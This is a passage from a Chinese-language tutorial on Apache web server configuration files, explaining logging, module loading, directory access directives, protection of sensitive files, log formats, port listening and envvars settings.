<h5 id="14-错误日志配置">1.4 错误日志配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#14-错误日志配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 全局错误日志</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ErrorLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/error.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 日志级别（从低到高）：</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># emerg alert crit error warn notice info debug trace1-8</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> warn</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 针对特定模块设置日志级别</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># LogLevel warn ssl:info rewrite:trace3</span></span></code></pre></figure>
<h5 id="15-模块加载">1.5 模块加载<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#15-模块加载" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 包含已启用的模块配置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> mods-enabled/*.load</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> mods-enabled/*.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 单个模块示例</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># LoadModule rewrite_module modules/mod_rewrite.so</span></span></code></pre></figure>
<h5 id="16-默认目录权限">1.6 默认目录权限<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#16-默认目录权限" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 拒绝所有目录的访问（默认拒绝策略）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> FollowSymLinks</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> None</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># /usr/share目录配置</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /usr/share</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> None</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Web根目录配置</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Indexes FollowSymLinks</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> None</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>Options指令说明：</strong></p>
<ul>
<li><code>None</code> - 禁用所有选项</li>
<li><code>All</code> - 启用除MultiViews外的所有选项</li>
<li><code>Indexes</code> - 允许目录列表（无索引文件时）</li>
<li><code>FollowSymLinks</code> - 允许跟随符号链接</li>
<li><code>SymLinksIfOwnerMatch</code> - 仅当链接和目标所有者相同时跟随</li>
<li><code>ExecCGI</code> - 允许执行CGI脚本</li>
<li><code>MultiViews</code> - 允许内容协商的多视图</li>
<li><code>Includes</code> - 允许服务器端包含（SSI）</li>
<li><code>IncludesNOEXEC</code> - 允许SSI但禁用#exec和#include</li>
</ul>
<p><strong>AllowOverride指令说明：</strong></p>
<ul>
<li><code>None</code> - 禁用.htaccess文件</li>
<li><code>All</code> - 允许.htaccess覆盖所有指令</li>
<li><code>AuthConfig</code> - 允许认证指令</li>
<li><code>FileInfo</code> - 允许文档类型控制指令</li>
<li><code>Indexes</code> - 允许目录索引控制</li>
<li><code>Limit</code> - 允许访问控制指令</li>
<li><code>Options</code> - 允许Options指令</li>
</ul>
<p><strong>Require指令说明：</strong></p>
<ul>
<li><code>Require all granted</code> - 允许所有访问</li>
<li><code>Require all denied</code> - 拒绝所有访问</li>
<li><code>Require ip 192.168.1.0/24</code> - 允许特定IP/网段</li>
<li><code>Require host example.com</code> - 允许特定主机名</li>
<li><code>Require valid-user</code> - 需要有效认证用户</li>
<li><code>Require user admin</code> - 需要特定用户</li>
<li><code>Require group admins</code> - 需要特定用户组</li>
</ul>
<h5 id="17-访问文件名配置">1.7 访问文件名配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#17-访问文件名配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 设置默认索引文件（按优先级）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> dir_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DirectoryIndex</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> index.html index.htm index.php</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 如果目录中存在这些文件，Apache会自动显示</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 否则显示目录列表（如果Indexes选项启用）</span></span></code></pre></figure>
<h5 id="18-保护敏感文件">1.8 保护敏感文件<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#18-保护敏感文件" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 拒绝访问.ht开头的文件（如.htaccess、.htpasswd）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;^\.ht&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 保护备份文件和配置文件</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;\.(bak|config|sql|fla|psd|ini|log|sh|inc|swp|dist)$&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 保护版本控制目录</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">DirectoryMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;^/.*/\.(git|svn|hg)/&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">DirectoryMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h5 id="19-日志格式定义">1.9 日志格式定义<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#19-日志格式定义" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Common日志格式</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogFormat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;%h %l %u %t \&quot;%r\&quot; %>s %b&quot; common</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Combined日志格式（包含Referer和User-Agent）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogFormat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;%h %l %u %t \&quot;%r\&quot; %>s %b \&quot;%{</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">Referer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}i\&quot; \&quot;%{</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">User-Agent</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}i\&quot;&quot; combined</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 带响应时间的日志格式</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogFormat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;%h %l %u %t \&quot;%r\&quot; %>s %b \&quot;%{</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">Referer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}i\&quot; \&quot;%{</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">User-Agent</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}i\&quot; %D&quot; custom</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Virtual Host日志格式</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogFormat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;%v:%p %h %l %u %t \&quot;%r\&quot; %>s %b&quot; vhost_combined</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 字段含义：</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %h - 客户端IP地址</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %l - 客户端身份（通常为&quot;-&quot;）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %u - 认证用户名</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %t - 时间戳</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %r - 请求行（方法 URL 协议）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %>s - 最终状态码</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %b - 响应字节数（不含头）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %B - 响应字节数（0代替&quot;-&quot;）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %D - 请求处理时间（微秒）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %T - 请求处理时间（秒）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %v - 虚拟主机名称</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %p - 服务器端口</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %{Referer}i - 引荐页面</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %{User-Agent}i - 用户代理字符串</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %{X-Forwarded-For}i - 代理转发的客户端IP</span></span></code></pre></figure>
<h5 id="110-包含其他配置文件">1.10 包含其他配置文件<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#110-包含其他配置文件" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 包含端口配置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Include</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ports.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 包含已启用的配置片段</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> conf-enabled/*.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 包含已启用的站点配置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> sites-enabled/*.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Include vs IncludeOptional：</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Include - 文件必须存在，否则启动失败</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># IncludeOptional - 文件可以不存在</span></span></code></pre></figure>
<hr/>
<h3 id="2-portsconf---端口配置文件">2. ports.conf - 端口配置文件<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-portsconf---端口配置文件" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>控制Apache监听的端口。</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 监听HTTP端口</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Listen</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 80</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 如果SSL模块启用，监听HTTPS端口</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ssl_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Listen</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 443</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_gnutls.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Listen</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 443</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 监听特定IP和端口</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Listen 192.168.1.100:80</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Listen 127.0.0.1:8080</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 监听多个端口</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Listen 80</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Listen 8080</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Listen 8443</span></span></code></pre></figure>
<p><strong>配置说明：</strong></p>
<ul>
<li><code>Listen 80</code> - 监听所有网络接口的80端口</li>
<li><code>Listen 192.168.1.100:80</code> - 仅监听特定IP的端口</li>
<li><code>Listen [::]:80</code> - 监听IPv6</li>
<li>修改后需要重启Apache生效</li>
</ul>
<hr/>
<h3 id="3-envvars---环境变量文件">3. envvars - 环境变量文件<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-envvars---环境变量文件" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>定义Apache运行时使用的环境变量。</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Apache运行用户和组</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> APACHE_RUN_USER</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">www-data</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> APACHE_RUN_GROUP</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">www-data</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># PID文件位置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> APACHE_PID_FILE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/var/run/apache2/apache2.pid</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 运行目录</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> APACHE_RUN_DIR</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/var/run/apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 锁文件目录</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> APACHE_LOCK_DIR</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/var/lock/apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 日志目录</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> APACHE_LOG_DIR</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/var/log/apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 语言设置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> LANG</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">C</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用core dump（调试用）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ulimit -c unlimited</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启动参数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># export APACHE_ARGUMENTS=&quot;&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 自定义环境变量</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># export MY_APP_ENV=production</span></span></code></pre></figure>
<hr/>
<h3 id="4-虚拟主机配置文件详解">4. 虚拟主机配置文件详解<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-虚拟主机配置文件详解" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
